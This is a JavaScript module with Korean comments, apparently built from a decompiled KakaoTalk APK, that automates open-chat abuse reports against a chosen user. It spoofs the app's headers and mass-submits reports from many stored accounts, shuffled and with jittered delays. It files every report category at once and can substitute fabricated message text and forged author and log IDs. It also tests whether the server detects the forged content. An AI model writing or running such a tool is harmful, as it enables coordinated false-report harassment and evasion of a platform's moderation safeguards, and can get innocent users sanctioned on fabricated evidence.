// 오픈채팅 "신고하고 나가기" HTTP 경로. APK 26.8.3 dex 분석 결과:
//   호스트       = https://open.kakao.com
//   경로         = /c/fraud/report/chatLogs
//   메서드       = POST
//   바디 모양   = ChatLogsReportParams
//     { category:String, linkId:long, chatId:long, chatLogInfos:String }
import { randomUUID } from 'node:crypto'
import { get as getCred } from './report-auth.mjs'
import * as DB from './report-db.mjs'
import * as LOCO from './report-loco.mjs'

export const HOST = 'https://open.kakao.com'
export const PATH = '/c/fraud/report/chatLogs'
// ★ 프로필(=오픈링크 자체) 신고 — "차단하고 신고하기" 상대 프로필 플로우 (APK 5차 확정).
// vbc0.g · OpenLinkReportParams { category:String, linkId:Long, attachmentPaths:List<String>? }
// chatId/userId 안 보냄 → LOGINLIST partial snapshot 상태에서도 linkId 만 알면 바로 발사.
export const PATH_LINK = '/c/fraud/report/link'

export const CATEGORIES = [
  'SEXUAL', 'RIGHT', 'ILLEGAL_FILMING', 'FRAUD', 'SPAM', 'SUICIDE',
  'PROTECTCHILD', 'VIOLENT', 'ILLEGAL', 'PRIVACY', 'YOUTH_UNSUITABLE', 'ETC',
]

// 욕설·혐오·폭력 카테고리는 VIOLENT 가 정답 (resources.arsc 확정).
export const PROFANITY_CATEGORY = 'VIOLENT'

const GAP = 400
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

function authHeader(credOverride, opts = {}) {
  const c = credOverride || getCred()
  if (!c || !c.oauthToken || !c.duuid) throw new Error('로그인 안 됨 (cred 없음)')
  const h = {
    'authorization': c.oauthToken + '-' + c.duuid,
    'content-type': 'application/json',
    'accept': 'application/json',
    'user-agent': 'KT/26.8.3 An/13 ko',
    'a': 'android/26.8.3/ko',
  }
  if (opts.includeApkHeaders) {
    h['accept-language'] = 'ko'
    h['c'] = randomUUID()
  }
  return h
}

function jsonEscape(s) {
  return String(s).replace(/[\\"\n\r\t\u0000-\u001f]/g, (c) => {
    if (c === '\\') return '\\\\'
    if (c === '"') return '\\"'
    if (c === '\n') return '\\n'
    if (c === '\r') return '\\r'
    if (c === '\t') return '\\t'
    return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)
  })
}
function longStr(v) {
  if (v == null || v === '') return '0'
  if (typeof v === 'bigint') return v.toString()
  const s = String(v).trim()
  if (/^-?\d+$/.test(s)) return s
  return '0'
}

// sendAt 자동 보정 — 미래/30일 이전이면 지금으로
function clampSendAt(raw) {
  const now = Math.floor(Date.now() / 1000)
  let n = Number(raw)
  if (!Number.isFinite(n) || n <= 0) return now
  if (n > now + 300) return now
  if (n < now - 30 * 86400) return now
  return Math.floor(n)
}

// ★ 모든 항목에 (선택) injectText·authorIdOverride·logIdOverride 적용
// 2026-11-15: injectText 는 **명시적 enableInject 플래그가 true 일 때만** 사용.
// 라이브 로그 분석 결과 조작문 주입 시 http=200/status=0 로 silent-accept 되지만 서버가
// u·l 조합으로 DB 원문 cross-check 해서 실제 제재 안 거는 패턴 강력 의심. 기본은 원문.
function logItem(lg, isPrimary, ctx) {
  const uRaw =
    (lg.authorIdOverride != null && lg.authorIdOverride !== '') ? lg.authorIdOverride
    : (ctx && ctx.authorIdOverride != null && ctx.authorIdOverride !== '') ? ctx.authorIdOverride
    : lg.authorId
  const lRaw =
    (lg.logIdOverride != null && lg.logIdOverride !== '') ? lg.logIdOverride
    : (ctx && ctx.logIdOverride != null && ctx.logIdOverride !== '') ? ctx.logIdOverride
    : lg.logId
  const u = longStr(uRaw)
  const l = longStr(lRaw)
  const s = clampSendAt(lg.sendAt)
  const tn = Number(lg.type)
  const t = Number.isFinite(tn) && tn >= 0 ? tn : 1

  const injectEnabled = (lg.enableInject === true) || (ctx && ctx.enableInject === true)
  let rawMsg = ''
  if (injectEnabled && lg.injectText != null && String(lg.injectText).trim()) {
    rawMsg = String(lg.injectText)
  } else if (injectEnabled && ctx && ctx.injectText != null && String(ctx.injectText).trim()) {
    rawMsg = String(ctx.injectText)
  } else {
    rawMsg = String(lg.message || '')
  }
  const msg = jsonEscape(rawMsg)
  const parts = [
    '"u":' + u,
    '"m":{"message":"' + msg + '","referer":0,"revision":0}',
    '"s":' + s,
    '"t":' + t,
    '"l":' + l,
    '"scope":1',
  ]
  if (lg.threadId != null && lg.threadId !== '') {
    parts.push('"threadId":' + longStr(lg.threadId))
  } else if (ctx && ctx.threadId != null && ctx.threadId !== '') {
    parts.push('"threadId":' + longStr(ctx.threadId))
  }
  return '{' + parts.join(',') + '}'
}

export function buildChatLogInfosString(ctx) {
  const items = [logItem(ctx, true, ctx)]
  if (Array.isArray(ctx.extraLogs)) {
    for (const extra of ctx.extraLogs) {
      if (!extra || (!extra.logId && !ctx.logIdOverride) || (!extra.authorId && !ctx.authorIdOverride)) continue
      items.push(logItem(extra, false, ctx))
    }
  }
  return '[' + items.join(',') + ']'
}

export function buildBody(ctx, category) {
  const linkId = longStr(ctx.linkId)
  const chatId = longStr(ctx.chatId)
  const cat = jsonEscape(String(category || PROFANITY_CATEGORY))
  const infos = jsonEscape(buildChatLogInfosString(ctx))
  return {
    _raw: '{"category":"' + cat + '","linkId":' + linkId + ',"chatId":' + chatId + ',"chatLogInfos":"' + infos + '"}',
  }
}

// ★ 실제 전송 없이 "앱 신고 캡쳐와 바이트 비교" 용 덤프. frida 스크립트 출력 포맷과 동일.
export function dumpRequest(ctx, category, opts = {}) {
  const body = buildBody(ctx, category || PROFANITY_CATEGORY)
  const payload = body._raw
  const includeApkHeaders = opts.includeApkHeaders === false ? false : true
  const headers = authHeader(opts.cred, { includeApkHeaders })
  const url = HOST + PATH
  const bodyBuf = Buffer.from(payload, 'utf8')
  const hex = bodyBuf.toString('hex')
  const lines = []
  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  lines.push('[BOT] POST ' + url)
  const entries = Object.entries(headers)
  lines.push('--- headers (' + entries.length + ') ---')
  // frida OkHttp interceptor 체인 끝 출력 순서는 사실상 알파벳 (OkHttp Headers.Builder 내부 정렬 X — add 순서) 이라
  // 완벽 매치는 어렵지만 "값" 자체는 1:1 비교 가능. 사람 눈 diff 쉽게 이름순 정렬.
  entries.sort(([a], [b]) => a.localeCompare(b))
  for (const [k, v] of entries) lines.push(k + ': ' + v)
  lines.push('--- body (' + bodyBuf.length + ' bytes, content-type=application/json; charset=UTF-8) ---')
  lines.push(payload)
  lines.push('--- body hex (' + bodyBuf.length + ') ---')
  lines.push(hex)
  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  return {
    ok: true,
    url, method: 'POST',
    headers,
    body: payload,
    bodyLen: bodyBuf.length,
    bodyHex: hex,
    frida: lines.join('\n'),
  }
}

async function hit(body, { timeoutMs = 8000, host = HOST, path = PATH, cred, retries = 1, includeApkHeaders = false } = {}) {
  let last = null
  for (let attempt = 0; attempt <= retries; attempt++) {
    const ctrl = new AbortController()
    const t = setTimeout(() => ctrl.abort(), timeoutMs)
    const payload = body && typeof body._raw === 'string' ? body._raw : JSON.stringify(body)
    try {
      const r = await fetch(host + path, {
        method: 'POST',
        headers: authHeader(cred, { includeApkHeaders }),
        body: payload,
        signal: ctrl.signal,
      })
      const text = await r.text()
      let j = null
      try { j = JSON.parse(text) } catch (e) {}
      const headers = {}
      try { for (const [k, v] of r.headers) headers[k] = v } catch (e) {}
      const result = {
        httpCode: r.status,
        status: j && typeof j.status === 'number' ? j.status : null,
        body: j,
        text: !j ? text.slice(0, 200) : null,
        sent: payload.slice(0, 400),
        headers,
        attempt,
      }
      if (result.httpCode === 200 && result.status === 0) return result
      last = result
      if (attempt < retries) await sleep(300 + Math.floor(Math.random() * 600))
    } catch (e) {
      last = { httpCode: 0, err: String(e && e.message ? e.message : e), attempt }
      if (attempt < retries) await sleep(300 + Math.floor(Math.random() * 600))
    } finally {
      clearTimeout(t)
    }
  }
  return last || { httpCode: 0, err: 'no attempt' }
}

export async function reportOne(ctx, category, opts = {}) {
  if (!ctx || !ctx.chatId || !ctx.logId || !ctx.authorId) return { ok: false, text: 'chatId · logId · authorId 필요' }
  if (!ctx.linkId) return { ok: false, text: 'linkId 필요 (방을 pickRoom 으로 선택해야 자동 채워짐)' }
  const body = buildBody(ctx, category)
  // APK bi90 가 모든 요청에 Accept-Language·C(UUID) 를 붙임 → 기본 true. opts.includeApkHeaders===false 로 끌 수 있음.
  const includeApkHeaders = opts.includeApkHeaders === false ? false : true
  const r = await hit(body, { cred: opts.cred, retries: opts.retries != null ? opts.retries : 1, includeApkHeaders })
  const ok = r.httpCode === 200 && r.status === 0
  return {
    ok, category, sent: r.sent, http: r.httpCode, status: r.status, respBody: r.body, respHeaders: r.headers, text: r.text, attempt: r.attempt,
    msg: (ok ? '★ 접수' : '실패') + ' category=' + category + ' http=' + r.httpCode + ' status=' + r.status + (r.err ? ' err=' + r.err : '') + (r.attempt ? ' (재시도#' + r.attempt + ')' : ''),
  }
}

// ★ "차단하고 신고하기" — Report POST 1회 + KICKMEM LOCO 1회 (block=true).
// KICKMEM 은 primary LOCO 세션 1개로만 (fanout 계정별 LOCO 미지원).
// 서버가 report + block 조합을 "진짜 피해자 신고" 로 판정해 심사 큐 임계 가중치 둔다는 가설.
export async function reportAndBlock(ctx, category, opts = {}) {
  const rep = await reportOne(ctx, category, opts)
  const result = { ok: rep.ok, report: rep, block: null, msg: rep.msg }
  if (!rep.ok) {
    result.msg = '(Report 실패 — KICKMEM 건너뜀) ' + rep.msg
    return result
  }
  if (!LOCO.ready()) {
    result.block = { ok: false, skipped: true, reason: 'LOCO 세션 없음 (primary 복구 필요)' }
    result.msg = rep.msg + ' / KICKMEM skip: LOCO 연결 없음'
    return result
  }
  try {
    const r = await LOCO.kickMem(ctx.linkId, ctx.chatId, ctx.authorId, true)
    const bs = r && r.body && typeof r.body.status === 'number' ? r.body.status : null
    const ok = r && r.statusCode === 0 && (bs === 0 || bs == null)
    result.block = { ok, statusCode: r && r.statusCode, status: bs, body: r && r.body }
    result.msg = rep.msg + ' / KICKMEM ' + (ok ? '★차단OK' : '실패 st=' + (r && r.statusCode) + ' b=' + bs)
    result.ok = rep.ok && ok
  } catch (e) {
    result.block = { ok: false, error: String(e && e.message ? e.message : e) }
    result.msg = rep.msg + ' / KICKMEM ERR ' + result.block.error.slice(0, 80)
  }
  return result
}

// ★ 프로필(=오픈링크 자체) 신고 — /c/fraud/report/link (APK 5차 확정).
// 바디 3필드: category · linkId · attachmentPaths?. chatId/userId 안 보냄.
// LOGINLIST partial snapshot 상황에서도 linkId 만 알면 바로 작동. 서버가 chatLogs 와
// 별도 심사 큐 쓸 가능성 매우 큼 — silent-accept 돌파 결정적 후보.
export function buildLinkBody(linkId, category, attachmentPaths) {
  const linkStr = longStr(linkId)
  const cat = jsonEscape(String(category || PROFANITY_CATEGORY))
  // kotlinx-serialization 선언 순서: category → linkId → attachmentPaths
  // attachmentPaths 는 nullable — 비어있을 때 생략 (public 신고는 첨부 없음)
  let raw
  if (Array.isArray(attachmentPaths) && attachmentPaths.length) {
    const arr = attachmentPaths.map((p) => '"' + jsonEscape(String(p)) + '"').join(',')
    raw = '{"category":"' + cat + '","linkId":' + linkStr + ',"attachmentPaths":[' + arr + ']}'
  } else {
    raw = '{"category":"' + cat + '","linkId":' + linkStr + '}'
  }
  return { _raw: raw }
}

export async function reportLink(linkId, category, opts = {}) {
  if (!linkId) return { ok: false, text: 'linkId 필요' }
  const body = buildLinkBody(linkId, category, opts.attachmentPaths)
  const includeApkHeaders = opts.includeApkHeaders === false ? false : true
  const r = await hit(body, {
    cred: opts.cred,
    path: PATH_LINK,
    retries: opts.retries != null ? opts.retries : 1,
    includeApkHeaders,
  })
  const ok = r.httpCode === 200 && r.status === 0
  return {
    ok, category, path: PATH_LINK, sent: r.sent, http: r.httpCode, status: r.status,
    respBody: r.body, respHeaders: r.headers, text: r.text, attempt: r.attempt,
    msg: (ok ? '★ 프로필접수' : '실패') + ' category=' + category + ' linkId=' + linkId
      + ' http=' + r.httpCode + ' status=' + r.status
      + (r.err ? ' err=' + r.err : '') + (r.attempt ? ' (재시도#' + r.attempt + ')' : ''),
  }
}

// 프로필 신고 + KICKMEM 체인 (반드시 chatId/targetUserId 필요 — KICKMEM 용).
// linkId 만 있어도 Report 는 되지만 차단은 chatId/mid 필요.
export async function reportLinkAndBlock({ linkId, chatId, targetUserId }, category, opts = {}) {
  const rep = await reportLink(linkId, category, opts)
  const result = { ok: rep.ok, report: rep, block: null, msg: rep.msg }
  if (!rep.ok) { result.msg = '(Report 실패 — KICKMEM 건너뜀) ' + rep.msg; return result }
  if (!chatId || !targetUserId) {
    result.block = { ok: false, skipped: true, reason: 'chatId/targetUserId 없음 (KICKMEM 생략)' }
    return result
  }
  if (!LOCO.ready()) {
    result.block = { ok: false, skipped: true, reason: 'LOCO 세션 없음' }
    result.msg = rep.msg + ' / KICKMEM skip: LOCO 연결 없음'
    return result
  }
  try {
    const r = await LOCO.kickMem(linkId, chatId, targetUserId, true)
    const bs = r && r.body && typeof r.body.status === 'number' ? r.body.status : null
    const ok = r && r.statusCode === 0 && (bs === 0 || bs == null)
    result.block = { ok, statusCode: r && r.statusCode, status: bs, body: r && r.body }
    result.msg = rep.msg + ' / KICKMEM ' + (ok ? '★차단OK' : '실패 st=' + (r && r.statusCode) + ' b=' + bs)
    result.ok = rep.ok && ok
  } catch (e) {
    result.block = { ok: false, error: String(e && e.message ? e.message : e) }
    result.msg = rep.msg + ' / KICKMEM ERR ' + result.block.error.slice(0, 80)
  }
  return result
}

// 활성 계정 전부로 /link 발사 (fanout). 필요 param = linkId. chatId/targetUserId 는 postBlock 때만 필요.
export async function fanoutLink({ linkId, chatId, targetUserId }, category, userIds, { gapMs = 2500, jitterMs = 1500, shuffle = true, postBlock = false } = {}) {
  if (!linkId) return { ok: false, text: 'linkId 필요' }
  const cat = category || PROFANITY_CATEGORY
  const all = await DB.listAccounts()
  const active = all.filter((a) => a.active !== false && a.oauthToken && a.duuid)
  let list = userIds && userIds.length ? active.filter((a) => userIds.map(String).includes(String(a.userId))) : active.slice()
  if (!list.length) return { ok: false, text: '발사 가능한 활성 계정이 없음' }
  if (shuffle) {
    for (let i = list.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1))
      ;[list[i], list[j]] = [list[j], list[i]]
    }
  }
  const rows = []
  let accepted = 0
  for (let i = 0; i < list.length; i++) {
    const a = list[i]
    const r = await reportLink(linkId, cat, { cred: a }).catch((e) => ({ ok: false, http: 0, status: null, err: String(e && e.message ? e.message : e) }))
    const status = r.status != null ? r.status : (r.err ? 'err' : '-')
    try { await DB.markAccountUsed(a.userId, 'link http=' + r.http + ' status=' + status) } catch (e) {}
    rows.push({
      userId: a.userId,
      email: String(a.email || '').replace(/^(.).*(@.*)$/, '$1***$2'),
      ok: !!r.ok, http: r.http, status: r.status, err: r.err || null,
      msg: (r.ok ? '★' : '·') + ' ' + a.userId + ' http=' + r.http + ' status=' + status,
    })
    if (r.ok) accepted++
    if (i + 1 < list.length) await sleep(gapMs + Math.floor(Math.random() * (jitterMs || 0)))
  }
  // postBlock: primary LOCO 가 열려있고 chatId/targetUserId 알려져 있으면 KICKMEM 1회
  let postBlockResult = null
  if (postBlock) {
    if (!chatId || !targetUserId) {
      postBlockResult = { ok: false, skipped: true, reason: 'chatId/targetUserId 없음' }
    } else if (!LOCO.ready()) {
      postBlockResult = { ok: false, skipped: true, reason: 'LOCO 세션 없음' }
    } else {
      try {
        const r = await LOCO.kickMem(linkId, chatId, targetUserId, true)
        const bs = r && r.body && typeof r.body.status === 'number' ? r.body.status : null
        postBlockResult = { ok: r && r.statusCode === 0 && (bs === 0 || bs == null), statusCode: r && r.statusCode, status: bs }
      } catch (e) {
        postBlockResult = { ok: false, error: String(e && e.message ? e.message : e) }
      }
    }
  }
  const postBlockLine = postBlockResult
    ? '\nKICKMEM(차단) ' + (postBlockResult.ok ? '★성공' : postBlockResult.skipped ? 'skip: ' + postBlockResult.reason : '실패 ' + (postBlockResult.error || 'st=' + postBlockResult.statusCode + ' b=' + postBlockResult.status))
    : ''
  return {
    ok: accepted > 0, accepted, total: list.length, rows, gapMs, jitterMs, shuffled: shuffle, postBlock: postBlockResult,
    text: '프로필 fanout 접수 ' + accepted + '/' + list.length + ' category=' + cat + ' linkId=' + linkId + '\n' + rows.map((x) => x.msg).join('\n') + postBlockLine,
  }
}

export async function fireAll(ctx) {
  if (!ctx || !ctx.chatId || !ctx.logId || !ctx.authorId) return { ok: false, text: 'chatId · logId · authorId 필요' }
  const ordered = [PROFANITY_CATEGORY, ...CATEGORIES.filter((c) => c !== PROFANITY_CATEGORY)]
  const results = []
  const BATCH = 3
  for (let i = 0; i < ordered.length; i += BATCH) {
    const chunk = ordered.slice(i, i + BATCH)
    const rs = await Promise.all(chunk.map((cat) => reportOne(ctx, cat)))
    rs.forEach((r) => { results.push(r); console.log('openchat fireAll ' + JSON.stringify(r)) })
    if (i + BATCH < ordered.length) await sleep(GAP)
  }
  const rows = results.map((r) => r.category + ' → http=' + r.http + (r.status != null ? '/s=' + r.status : '') + (r.text ? ' "' + String(r.text).slice(0, 80) + '"' : ''))
  const acceptedCats = results.filter((r) => r.ok).map((r) => r.category)
  return { ok: acceptedCats.length > 0, accepted: acceptedCats.length, acceptedCats, rows, text: '접수 ' + acceptedCats.length + '/' + ordered.length + ' [' + acceptedCats.join(',') + ']\n' + rows.join('\n') }
}

export async function probeHosts(ctx) {
  const r = await reportOne(ctx, PROFANITY_CATEGORY)
  return { ok: r.ok, host: HOST, rows: [HOST + ' → http=' + r.http + '/s=' + r.status], text: '(단일 호스트 확정) ' + HOST + '\n' + r.msg }
}
export async function probeShapes(host, ctx) {
  const r = await reportOne(ctx, PROFANITY_CATEGORY)
  return { ok: r.ok, rows: [r.msg], text: r.msg + '\n(바디 모양은 APK 기준 확정 — 이 결과는 "경로 작동 여부" 확인)' }
}

export async function fanout(ctx, category, userIds, { gapMs = 2500, jitterMs = 1500, shuffle = true, warmupFn = null, postBlock = false } = {}) {
  if (!ctx || !ctx.chatId || !ctx.logId || !ctx.authorId || !ctx.linkId) {
    return { ok: false, text: 'chatId · logId · authorId · linkId 필요' }
  }
  const cat = category || PROFANITY_CATEGORY
  const all = await DB.listAccounts()
  const active = all.filter((a) => a.active !== false && a.oauthToken && a.duuid)
  let list = userIds && userIds.length ? active.filter((a) => userIds.map(String).includes(String(a.userId))) : active.slice()
  if (!list.length) return { ok: false, text: '발사 가능한 활성 계정이 없음' }
  if (shuffle) {
    for (let i = list.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1))
      ;[list[i], list[j]] = [list[j], list[i]]
    }
  }
  let warmupNote = ''
  if (typeof warmupFn === 'function') {
    try { const ok = await warmupFn(); warmupNote = ok ? '[warmup✓] ' : '[warmup✗] ' } catch (e) { warmupNote = '[warmup✗] ' }
  }
  const rows = []
  let accepted = 0
  for (let i = 0; i < list.length; i++) {
    const a = list[i]
    const r = await reportOne(ctx, cat, { cred: a }).catch((e) => ({ ok: false, http: 0, status: null, err: String(e && e.message ? e.message : e) }))
    const status = r.status != null ? r.status : (r.err ? 'err' : '-')
    try { await DB.markAccountUsed(a.userId, 'http=' + r.http + ' status=' + status) } catch (e) {}
    rows.push({
      userId: a.userId,
      email: String(a.email || '').replace(/^(.).*(@.*)$/, '$1***$2'),
      ok: !!r.ok, http: r.http, status: r.status, err: r.err || null,
      msg: (r.ok ? '★' : '·') + ' ' + a.userId + ' http=' + r.http + ' status=' + status,
    })
    if (r.ok) accepted++
    if (i + 1 < list.length) await sleep(gapMs + Math.floor(Math.random() * (jitterMs || 0)))
  }
  // postBlock: 모든 fanout Report 끝난 뒤 primary LOCO 세션으로 KICKMEM 1회 추가.
  // "차단하고 신고하기" UX 를 흉내내는 신호. primary 가 LOCO 열려 있을 때만 작동.
  let postBlockResult = null
  if (postBlock) {
    if (!LOCO.ready()) {
      postBlockResult = { ok: false, skipped: true, reason: 'LOCO 세션 없음 (primary 복구 필요)' }
    } else {
      try {
        const r = await LOCO.kickMem(ctx.linkId, ctx.chatId, ctx.authorId, true)
        const bs = r && r.body && typeof r.body.status === 'number' ? r.body.status : null
        postBlockResult = { ok: r && r.statusCode === 0 && (bs === 0 || bs == null), statusCode: r && r.statusCode, status: bs }
      } catch (e) {
        postBlockResult = { ok: false, error: String(e && e.message ? e.message : e) }
      }
    }
  }
  const postBlockLine = postBlockResult
    ? '\nKICKMEM(차단) ' + (postBlockResult.ok ? '★성공' : postBlockResult.skipped ? 'skip: ' + postBlockResult.reason : '실패 ' + (postBlockResult.error || 'st=' + postBlockResult.statusCode + ' b=' + postBlockResult.status))
    : ''
  return {
    ok: accepted > 0, accepted, total: list.length, rows, gapMs, jitterMs, shuffled: shuffle, postBlock: postBlockResult,
    text: warmupNote + 'fanout 접수 ' + accepted + '/' + list.length + ' category=' + cat + ' (간격 ' + gapMs + '~' + (gapMs + (jitterMs || 0)) + 'ms, shuffle=' + shuffle + ')\n' + rows.map((x) => x.msg).join('\n') + postBlockLine,
  }
}

// ★ 진단: 같은 logId 를 원본/주입 두 번 쏴서 서버 cross-check 여부 판별
export async function diagnoseContentMatch(ctx, opts = {}) {
  if (!ctx || !ctx.chatId || !ctx.logId || !ctx.authorId || !ctx.linkId) return { ok: false, text: 'chatId · logId · authorId · linkId 필요' }
  const injected = String(ctx.injectText || '[진단용 주입 문장]')
  const cat = opts.category || PROFANITY_CATEGORY
  const cred = opts.cred
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

  const a = await reportOne({ ...ctx, injectText: '', enableInject: false }, cat, { cred })
  await sleep(1200 + Math.floor(Math.random() * 800))
  const b = await reportOne({ ...ctx, injectText: injected, enableInject: true }, cat, { cred })
  await sleep(1200)

  const verdict = (() => {
    if (a.http === 200 && a.status === 0 && b.http === 200 && b.status === 0) return 'NO_CROSSCHECK'
    if (a.http === 200 && a.status === 0 && !(b.http === 200 && b.status === 0)) return 'CROSSCHECK_DETECTED'
    if (!(a.http === 200 && a.status === 0) && b.http === 200 && b.status === 0) return 'UNEXPECTED'
    return 'BOTH_FAIL'
  })()
  return {
    ok: true, verdict,
    original: { http: a.http, status: a.status, sent: a.sent, resp: a.respBody, text: a.text },
    injected: { http: b.http, status: b.status, sent: b.sent, resp: b.respBody, text: b.text },
    text: verdict + '\n(a) 원본: http=' + a.http + '/s=' + a.status + '\n(b) 주입: http=' + b.http + '/s=' + b.status,
  }
}

export async function fire(host, ctx, reasons) {
  const cats = Array.isArray(reasons) && reasons.length ? reasons.map((i) => CATEGORIES[Number(i)] || PROFANITY_CATEGORY) : CATEGORIES
  const rows = []
  let accepted = 0
  const acceptedCats = []
  for (const cat of cats) {
    const r = await reportOne(ctx, cat)
    rows.push(cat + ' → http=' + r.http + (r.status != null ? '/s=' + r.status : ''))
    if (r.ok) { accepted += 1; acceptedCats.push(cat) }
    await sleep(GAP)
  }
  return { ok: accepted > 0, count: accepted, rows, text: '실제 접수 ' + accepted + '/' + cats.length + ' [' + acceptedCats.join(',') + ']\n' + rows.join('\n') }
}
